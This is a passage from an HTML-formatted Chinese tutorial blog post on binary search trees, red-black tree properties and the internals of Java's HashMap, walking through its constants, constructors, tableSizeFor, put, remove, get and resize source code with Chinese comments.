tree），是指一棵空树或者具有下列性质的二叉树：<br></p>\n<ul>\n<li>若任意结点的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li>\n<li>若任意结点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</li>\n<li>任意结点的左、右子树也分别为二叉查找树。</li>\n<li>没有键值相等的结点（no duplicate nodes）。</li>\n</ul>\n<p>二叉查找树一般查找时间为O(lgn),当极端情况出现时，二叉树退化为一颗具有n个节点的线性链后，复杂度退化为线性O(n).</p>\n<h6 id=\"1-2-2-红黑树\"><a href=\"#1-2-2-红黑树\" class=\"headerlink\" title=\"1.2.2 红黑树\"></a>1.2.2 红黑树</h6><p>红黑树本质上是一颗二叉查找树,红黑树增加了一些性质，保证在最坏的情况下，复杂的也是O(logn).<br></p>\n<ul>\n<li>每个结点要么是红的，要么是黑的。  </li>\n<li>根结点是黑的。  </li>\n<li>每个叶结点（叶结点即指树尾端NIL指针或NULL结点）是黑的。  </li>\n<li>如果一个结点是红的，那么它的俩个儿子都是黑的。  </li>\n<li>对于任一结点而言，其到叶结点树尾端NIL指针的每一条路径都包含相同数目的黑结点。  </li>\n</ul>\n<p>图片来源(<a href=\"https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/03.01.md\" target=\"_blank\" rel=\"noopener\">https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/03.01.md</a>)<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/collection/hongheishu.png\" alt=\"shu\"></p>\n<h6 id=\"1-2-3-红黑树的操作\"><a href=\"#1-2-3-红黑树的操作\" class=\"headerlink\" title=\"1.2.3 红黑树的操作\"></a>1.2.3 红黑树的操作</h6><p>当我们在对红黑树进行插入和删除等操作时，对树做了修改，那么可能会违背红黑树的性质。为了继续保持红黑树的性质，我们可以通过对结点进行重新着色，以及对树进行相关的旋转操作，即修改树中某些结点的颜色及指针结构，来达到对红黑树进行插入或删除结点等操作后，继续保持它的性质或平衡。<br><br>不在这里详述，单独写一篇文章<br></p>\n<h5 id=\"1-3-HashMap\"><a href=\"#1-3-HashMap\" class=\"headerlink\" title=\"1.3 HashMap\"></a>1.3 HashMap</h5><h6 id=\"1-3-1-属性\"><a href=\"#1-3-1-属性\" class=\"headerlink\" title=\"1.3.1 属性\"></a>1.3.1 属性</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//初始容量  10000(2进制)</span><br><span class=\"line\">static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16</span><br><span class=\"line\"></span><br><span class=\"line\">//最大容量</span><br><span class=\"line\">static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;</span><br><span class=\"line\"></span><br><span class=\"line\">//默认负载因子</span><br><span class=\"line\">static final float DEFAULT_LOAD_FACTOR = 0.75f;</span><br><span class=\"line\"></span><br><span class=\"line\">//当节点中的元素个数大于该值时，桶中链表转换为树</span><br><span class=\"line\">static final int TREEIFY_THRESHOLD = 8;</span><br><span class=\"line\"></span><br><span class=\"line\">//同上，不过是将树转化为链表表</span><br><span class=\"line\">static final int UNTREEIFY_THRESHOLD = 6;</span><br><span class=\"line\"></span><br><span class=\"line\">//桶可能被转为树形结构时的最小容量</span><br><span class=\"line\">static final int MIN_TREEIFY_CAPACITY = 64;</span><br></pre></td></tr></table></figure>\n<h6 id=\"1-3-2-构造方法\"><a href=\"#1-3-2-构造方法\" class=\"headerlink\" title=\"1.3.2 构造方法\"></a>1.3.2 构造方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public HashMap(int initialCapacity, float loadFactor) &#123;</span><br><span class=\"line\">   if (initialCapacity &lt; 0)</span><br><span class=\"line\">       throw new IllegalArgumentException(&quot;Illegal initial capacity: &quot; +</span><br><span class=\"line\">                                          initialCapacity);</span><br><span class=\"line\">   if (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class=\"line\">       initialCapacity = MAXIMUM_CAPACITY;</span><br><span class=\"line\">   if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))</span><br><span class=\"line\">       throw new IllegalArgumentException(&quot;Illegal load factor: &quot; +</span><br><span class=\"line\">                                          loadFactor);</span><br><span class=\"line\">   this.loadFactor = loadFactor;</span><br><span class=\"line\">   this.threshold = tableSizeFor(initialCapacity);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public HashMap(int initialCapacity) &#123;</span><br><span class=\"line\">   this(initialCapacity, DEFAULT_LOAD_FACTOR);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public HashMap() &#123;</span><br><span class=\"line\">   this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public HashMap(Map&lt;? extends K, ? extends V&gt; m) &#123;</span><br><span class=\"line\">   this.loadFactor = DEFAULT_LOAD_FACTOR;</span><br><span class=\"line\">   putMapEntries(m, false);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中，初始化threshold时:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static final int tableSizeFor(int cap) &#123;</span><br><span class=\"line\">    int n = cap - 1;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 1;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 2;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 4;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 8;</span><br><span class=\"line\">    n |= n &gt;&gt;&gt; 16;</span><br><span class=\"line\">    return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此算法原理为: <br><br>原文:<a href=\"https://www.cnblogs.com/loading4/p/6239441.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/loading4/p/6239441.html</a><br><br>通过位运算，找到大于入参的最近一个2的整数次幂<br></p>\n<ul>\n<li><p>先来假设n的二进制为01xxx…xxx。接着</p>\n</li>\n<li><p>对n右移1位：001xx…xxx，再位或：011xx…xxx</p>\n</li>\n<li><p>对n右移2为：00011…xxx，再位或：01111…xxx</p>\n</li>\n<li><p>此时前面已经有四个1了，再右移4位且位或可得8个1</p>\n</li>\n<li><p>同理，有8个1，右移8位肯定会让后八位也为1。</p>\n</li>\n<li>综上可得，该算法让最高位的1后面的位全变为1。</li>\n<li>最后再让结果n+1，即得到了2的整数次幂的值了</li>\n</ul>\n<p><strong>threshold这个成员变量是阈值，决定了是否要将散列表再散列。它的值应该是：capacity * load_factor才对的。里仅仅是一个初始化，当创建哈希表的时候，它会重新赋值<br></strong></p>\n<h6 id=\"1-3-3-增-put\"><a href=\"#1-3-3-增-put\" class=\"headerlink\" title=\"1.3.3 增 put()\"></a>1.3.3 增 put()</h6><p>HashMap的内部链表结构:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123;</span><br><span class=\"line\">    final int hash;</span><br><span class=\"line\">    final K key;</span><br><span class=\"line\">    V value;</span><br><span class=\"line\">    Node&lt;K,V&gt; next;</span><br><span class=\"line\"></span><br><span class=\"line\">    Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class=\"line\">        this.hash = hash;</span><br><span class=\"line\">        this.key = key;</span><br><span class=\"line\">        this.value = value;</span><br><span class=\"line\">        this.next = next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  .....</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>添加元素的put()方法:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public V put(K key, V value) &#123;</span><br><span class=\"line\">    return putVal(hash(key), key, value, false, true);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class=\"line\">                  boolean evict) &#123;</span><br><span class=\"line\">  //链表结构存储</span><br><span class=\"line\">   Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span><br><span class=\"line\">   //散列表为null时  初始化</span><br><span class=\"line\">   if ((tab = table) == null || (n = tab.length) == 0)</span><br><span class=\"line\">       n = (tab = resize()).length;</span><br><span class=\"line\">  //没有发生碰撞，直接存储</span><br><span class=\"line\">   if ((p = tab[i = (n - 1) &amp; hash]) == null)</span><br><span class=\"line\">       tab[i] = newNode(hash, key, value, null);</span><br><span class=\"line\">  //发生碰撞</span><br><span class=\"line\">   else &#123;</span><br><span class=\"line\">       Node&lt;K,V&gt; e; K k;</span><br><span class=\"line\">      //hash和key都相等，记录下来，下一步处理</span><br><span class=\"line\">       if (p.hash == hash &amp;&amp;</span><br><span class=\"line\">           ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">           e = p;</span><br><span class=\"line\">      //树形结构，调用树的方法</span><br><span class=\"line\">       else if (p instanceof TreeNode)</span><br><span class=\"line\">           e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);</span><br><span class=\"line\">      //链表结构</span><br><span class=\"line\">       else &#123;</span><br><span class=\"line\">           for (int binCount = 0; ; ++binCount) &#123;</span><br><span class=\"line\">               //没有找到映射的节点，在链表尾部插入</span><br><span class=\"line\">               if ((e = p.next) == null) &#123;</span><br><span class=\"line\">                   p.next = newNode(hash, key, value, null);</span><br><span class=\"line\">                   //节点数大于等于TREEIFY_THRESHOLD 转为树形存储</span><br><span class=\"line\">                   if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st</span><br><span class=\"line\">                       treeifyBin(tab, hash);</span><br><span class=\"line\">                   break;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">               //找到hash值映射的节点，插入</span><br><span class=\"line\">               if (e.hash == hash &amp;&amp;</span><br><span class=\"line\">                   ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">                   break;</span><br><span class=\"line\">               p = e;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       //上一步的e,因为hash和key都存在，用新值覆盖旧值，返回旧值</span><br><span class=\"line\">       if (e != null) &#123; // existing mapping for key</span><br><span class=\"line\">           V oldValue = e.value;</span><br><span class=\"line\">           if (!onlyIfAbsent || oldValue == null)</span><br><span class=\"line\">               e.value = value;</span><br><span class=\"line\">           afterNodeAccess(e);</span><br><span class=\"line\">           return oldValue;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   ++modCount;</span><br><span class=\"line\">   //检查阈值，是否再次散列</span><br><span class=\"line\">   if (++size &gt; threshold)</span><br><span class=\"line\">       resize();</span><br><span class=\"line\">   afterNodeInsertion(evict);</span><br><span class=\"line\">   return null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-3-4-删-remove\"><a href=\"#1-3-4-删-remove\" class=\"headerlink\" title=\"1.3.4 删 remove()\"></a>1.3.4 删 remove()</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public V remove(Object key) &#123;</span><br><span class=\"line\">    Node&lt;K,V&gt; e;</span><br><span class=\"line\">    return (e = removeNode(hash(key), key, null, false, true)) == null ?</span><br><span class=\"line\">        null : e.value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">final Node&lt;K,V&gt; removeNode(int hash, Object key, Object value,</span><br><span class=\"line\">                           boolean matchValue, boolean movable) &#123;</span><br><span class=\"line\">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, index;</span><br><span class=\"line\">    //hash值指向的桶是否存在</span><br><span class=\"line\">    if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp;</span><br><span class=\"line\">        (p = tab[index = (n - 1) &amp; hash]) != null) &#123;</span><br><span class=\"line\">        Node&lt;K,V&gt; node = null, e; K k; V v;</span><br><span class=\"line\">        //在首位进行查找，记录下找到的节点</span><br><span class=\"line\">        if (p.hash == hash &amp;&amp;</span><br><span class=\"line\">            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">            node = p;</span><br><span class=\"line\">        //没找到，继续找</span><br><span class=\"line\">        else if ((e = p.next) != null) &#123;</span><br><span class=\"line\">           //树里面找</span><br><span class=\"line\">            if (p instanceof TreeNode)</span><br><span class=\"line\">                node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);</span><br><span class=\"line\">            else &#123;</span><br><span class=\"line\">              //链表里面找</span><br><span class=\"line\">                do &#123;</span><br><span class=\"line\">                    if (e.hash == hash &amp;&amp;</span><br><span class=\"line\">                        ((k = e.key) == key ||</span><br><span class=\"line\">                         (key != null &amp;&amp; key.equals(k)))) &#123;</span><br><span class=\"line\">                        node = e;</span><br><span class=\"line\">                        break;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    p = e;</span><br><span class=\"line\">                &#125; while ((e = e.next) != null);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //将找到的node删除</span><br><span class=\"line\">        if (node != null &amp;&amp; (!matchValue || (v = node.value) == value ||</span><br><span class=\"line\">                             (value != null &amp;&amp; value.equals(v)))) &#123;</span><br><span class=\"line\">            if (node instanceof TreeNode)</span><br><span class=\"line\">                ((TreeNode&lt;K,V&gt;)node).removeTreeNode(this, tab, movable);</span><br><span class=\"line\">            else if (node == p)</span><br><span class=\"line\">                tab[index] = node.next;</span><br><span class=\"line\">            else</span><br><span class=\"line\">                p.next = node.next;</span><br><span class=\"line\">            ++modCount;</span><br><span class=\"line\">            --size;</span><br><span class=\"line\">            afterNodeRemoval(node);</span><br><span class=\"line\">            return node;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"1-3-5-查-get\"><a href=\"#1-3-5-查-get\" class=\"headerlink\" title=\"1.3.5 查 get()\"></a>1.3.5 查 get()</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public V get(Object key) &#123;</span><br><span class=\"line\">   Node&lt;K,V&gt; e;</span><br><span class=\"line\">   return (e = getNode(hash(key), key)) == null ? null : e.value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">final Node&lt;K,V&gt; getNode(int hash, Object key) &#123;</span><br><span class=\"line\">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k;</span><br><span class=\"line\">    if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp;</span><br><span class=\"line\">        (first = tab[(n - 1) &amp; hash]) != null) &#123;</span><br><span class=\"line\">        if (first.hash == hash &amp;&amp; // always check first node</span><br><span class=\"line\">            ((k = first.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">            return first;</span><br><span class=\"line\">        if ((e = first.next) != null) &#123;</span><br><span class=\"line\">            if (first instanceof TreeNode)</span><br><span class=\"line\">                return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class=\"line\">            do &#123;</span><br><span class=\"line\">                if (e.hash == hash &amp;&amp;</span><br><span class=\"line\">                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">                    return e;</span><br><span class=\"line\">            &#125; while ((e = e.next) != null);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"1-3-6-resize\"><a href=\"#1-3-6-resize\" class=\"headerlink\" title=\"1.3.6 resize()\"></a>1.3.6 resize()</h6><p>resize()对散列表进行扩容。<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">final Node&lt;K,V&gt;[] resize() &#123;</span><br><span class=\"line\">   Node&lt;K,V&gt;[] oldTab = table;</span><br><span class=\"line\">   //容量</span><br><span class=\"line\">   int oldCap = (oldTab == null) ? 0 : oldTab.length;</span><br><span class=\"line\">   //负载</span><br><span class=\"line\">   int oldThr = threshold;</span><br><span class=\"line\">   int newCap, newThr = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">   if (oldCap &gt; 0) &#123;</span><br><span class=\"line\">       //大于等于最大容量，不能继续散列扩大</span><br><span class=\"line\">       if (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class=\"line\">           threshold = Integer.MAX_VALUE;</span><br><span class=\"line\">           return oldTab;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class=\"line\">                oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class=\"line\">          //扩大两倍</span><br><span class=\"line\">           newThr = oldThr &lt;&lt; 1; // double threshold</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   else if (oldThr &gt; 0) // initial capacity was placed in threshold</span><br><span class=\"line\">       newCap = oldThr;</span><br><span class=\"line\">   //第一次初始化散列表</span><br><span class=\"line\">   else &#123;               // zero initial threshold signifies using defaults</span><br><span class=\"line\">       newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class=\"line\">       newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   if (newThr == 0) &#123;</span><br><span class=\"line\">       float ft = (float)newCap * loadFactor;</span><br><span class=\"line\">       newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ?</span><br><span class=\"line\">                 (int)ft : Integer.MAX_VALUE);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   threshold = newThr;</span><br><span class=\"line\"></span><br><span class=\"line\">   //将旧的散列表复制到新的散列表</span><br><span class=\"line\">   @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class=\"line\">       Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap];</span><br><span class=\"line\">   table = newTab;</span><br><span class=\"line\">   if (oldTab != null) &#123;</span><br><span class=\"line\">       for (int j = 0; j &lt; oldCap; ++j) &#123;</span><br><span class=\"line\">           Node&lt;K,V&gt; e;</span><br><span class=\"line\">           if ((e = oldTab[j]) != null) &#123;</span><br><span class=\"line\">               oldTab[j] = null;</span><br><span class=\"line\">               if (e.next == null)</span><br><span class=\"line\">                   newTab[e.hash &amp; (newCap - 1)] = e;</span><br><span class=\"line\">              //树     </span><br><span class=\"line\">               else if (e instanceof TreeNode)</span><br><span class=\"line\">                   ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap);</span><br><span class=\"line\">              //链表</span><br><span class=\"line\">               else &#123; // preserve order</span><br><span class=\"line\">                   Node&lt;K,V&gt; loHead = null, loTail = null;</span><br><span class=\"line\">                   Node&lt;K,V&gt; hiHead = null, hiTail = null;</span><br><span class=\"line\">                   Node&lt;K,V&gt; next;</span><br><span class=\"line\">                   do &#123;</span><br><span class=\"line\">                       next = e.next;</span><br><span class=\"line\">                       if ((e.hash &amp; oldCap) == 0) &#123;</span><br><span class=\"line\">                           if (loTail == null)</span><br><span class=\"line\">                               loHead = e;</span><br><span class=\"line\">                           else</span><br><span class=\"line\">                               loTail.next = e;</span><br><span class=\"line\">                           loTail = e;</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\">                       else &#123;</span><br><span class=\"line\">                           if (hiTail == null)</span><br><span class=\"line\">                               hiHead = e;</span><br><span class=\"line\">                           else</span><br><span class=\"line\">                               hiTail.next = e;</span><br><span class=\"line\">                           hiTail = e;</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\">                   &#125; while ((e = next) != null);</span><br><span class=\"line\">                   if (loTail != null) &#123;</span><br><span class=\"line\">                       loTail.next = null;</span><br><span class=\"line\">                       newTab[j] = loHead;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">                   if (hiTail != null) &#123;</span><br><span class=\"line\">                       hiTail.next = null;</span><br><span class=\"line\">                       newTab[j + oldCap] = hiHead;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   return newTab;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-3-7-HashMap总结注意\"><a href=\"#1-3-7-HashMap总结注意\" class=\"headerlink\" title=\"1.3.7 HashMap总结注意\"></a>1.3.7 